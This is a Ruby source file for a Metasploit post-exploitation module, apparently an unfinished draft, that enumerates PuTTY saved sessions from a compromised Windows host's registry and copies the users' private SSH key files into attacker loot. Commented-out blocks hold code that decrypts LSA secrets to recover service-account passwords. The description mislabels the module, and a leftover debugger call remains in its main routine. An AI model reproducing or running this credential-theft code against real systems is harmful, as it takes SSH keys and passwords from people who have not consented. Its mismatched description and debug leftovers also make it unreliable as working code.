##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/post/windows/priv'
require 'msf/core/post/common'
require 'msf/core/post/windows/registry'

class Metasploit3 < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Registry

  INTERESTING_KEYS=['HostName','PublicKeyFile','UserName','PortNumber','PortForwardings']
  def initialize(info={})
    super(update_info(info,
      'Name'            => "PuTTY thing",
      'Description'     => %q{
        This module will attempt to enumerate the LSA Secrets keys within the registry. The registry value used is:
        HKEY_LOCAL_MACHINE\\Security\\Policy\\Secrets\\. Thanks goes to Maurizio Agazzini and Mubix for decrypt
        code from cachedump.
        },
      'License'         => MSF_LICENSE,
      'Platform'        => ['win'],
      'SessionTypes'    => ['meterpreter'],
      'Author'          => ['Stuart Morgan <stuart.morgan[at]mwrinfosecurity.com>']
    ))
  end


#  # Decrypted LSA key is passed into this method
#  def get_secret(lsa_key)
#    output = "\n"
#
#    # LSA Secret key location within the registry
#    root_regkey = "HKLM\\Security\\Policy\\Secrets\\"
#    services_key = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\"
#
#    secrets = registry_enumkeys(root_regkey)
#
#    secrets.each do |secret_regkey|
#      sk_arr = registry_enumkeys(root_regkey + "\\" +  secret_regkey)
#      next unless sk_arr
#
#      sk_arr.each do |mkeys|
#        # CurrVal stores the currently set value of the key. In the case
#        # of services, this is usually the password for the service
#        # account.
#        next unless mkeys == "CurrVal"
#
#        val_key = root_regkey + "\\" + secret_regkey + "\\" + mkeys
#        encrypted_secret = registry_getvaldata(val_key, "")
#
#        next unless encrypted_secret
#
#        if lsa_vista_style?
#          # Magic happens here
#          decrypted = decrypt_lsa_data(encrypted_secret, lsa_key)
#        else
#          # and here
#          encrypted_secret = encrypted_secret[0xC..-1]
#          decrypted = decrypt_secret_data(encrypted_secret, lsa_key)
#        end
#
#        next unless decrypted.length > 0
#
#        # axe all the non-printables
#        decrypted = decrypted.scan(/[[:print:]]/).join
#
#        if secret_regkey.start_with?("_SC_")
#          # Service secrets are named like "_SC_yourmom" for a service
#          # with name "yourmom". Strip off the "_SC_" to get something
#          # we can lookup in the list of services to find out what
#          # account this secret is associated with.
#          svc_name = secret_regkey[4,secret_regkey.length]
#          svc_user = registry_getvaldata(services_key + svc_name, "ObjectName")
#
#          # if the unencrypted value is not blank and is a service, print
#          print_good("Key: #{secret_regkey}\n Username: #{svc_user} \n Decrypted Value: #{decrypted}\n")
#          output  << "Key: #{secret_regkey}\n Username: #{svc_user} \n Decrypted Value: #{decrypted}\n"
#        else
#          # if the unencrypted value is not blank, print
#          print_good("Key: #{secret_regkey}\n Decrypted Value: #{decrypted}\n")
#          output  << "Key: #{secret_regkey}\n Decrypted Value: #{decrypted}\n"
#        end
#      end
#    end
#
#    return output
#  end

  def get_saved_session_details(sessions)

    all_sessions = []
    sessions.each do |ses|
        newses = {}
        newses['Name'] = Rex::Text.uri_decode(ses)
        INTERESTING_KEYS.each do |key|
            newses[key] = registry_getvaldata("HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\\#{ses}", key).to_s
        end
        all_sessions << newses
    end 
    all_sessions
  end

  def report(info)

    # Results table holds raw string data
    results_table = Rex::Ui::Text::Table.new(
      'Header'     => "PuTTY Saved Sessions",
      'Indent'     => 1,
      'SortIndex'  => -1,
      'Columns'    => ['Name'].append(INTERESTING_KEYS).flatten
    )

    info.each do |result|
      row = []
      row << result['Name']
      INTERESTING_KEYS.each do |key|
        row << result[key]
      end  
      results_table << row
    end

    print_line results_table.to_s
    #stored_path = store_loot('ad.computers', 'text/plain', session, results_table.to_csv)
    #print_status("Results saved to: #{stored_path}")
  end

  def grab_private_keys(sessions)
    sessions.each do |ses|
        filename = ses['PublicKeyFile'].to_s
        next if filename.empty?

        if file?(filename)
           ppk = read_file(filename) 
           stored_path = store_loot('putty.ppk.file', 'text/plain', session, ppk)
           print_status("PuTTY private key file for \'#{ses['Name']}\' (#{filename}) saved to: #{stored_path}")
        else
           print_error("PuTTY private key file for \'#{ses['Name']}\' (#{filename}) could not be found.")
        end
    end
  end

  # The sauce starts here
  def run

    # Look for saved sessions, break out if not.
    saved_sessions = registry_enumkeys('HKCU\\Software\\SimonTatham\\PuTTY\\Sessions')
    if saved_sessions.nil? || saved_sessions.empty?
        print_error('No saved sessions found')
        return
    end

    # Tell the user how many sessions have been found (with correct English)
    print_status("Found #{saved_sessions.count} session#{saved_sessions.count>1?'s':''}") 

    # Retrieve the saved session details & print them to the screen in a report
    all_saved_sessions = get_saved_session_details(saved_sessions)
    report(all_saved_sessions)

    # If the private key file has been configured, retrieve it and save it to loot
    print_status("Downloading private keys...")
    grab_private_keys(all_saved_sessions)

    binding.pry

#    hostname = sysinfo['Computer']
#    print_status("Executing module against #{hostname}")
#
#    print_status('Obtaining boot key...')
#    bootkey = capture_boot_key
#    vprint_status("Boot key: #{bootkey.unpack("H*")[0]}")
#
#    print_status('Obtaining Lsa key...')
#    lsa_key = capture_lsa_key(bootkey)
#    if lsa_key.nil?
#      print_error("Could not retrieve LSA key. Are you SYSTEM?")
#      return
#    end
#    vprint_status("Lsa Key: #{lsa_key.unpack("H*")[0]}")
#
#    secrets = hostname + get_secret(lsa_key)
#
#    print_status("Writing to loot...")
#
#    path = store_loot(
#      'registry.lsa.sec',
#      'text/plain',
#      session,
#      secrets,
#      'reg_lsa_secrts.txt',
#      'Registry LSA Secret Decrypted File'
#      )
#
#      print_status("Data saved in: #{path}")
  end
end
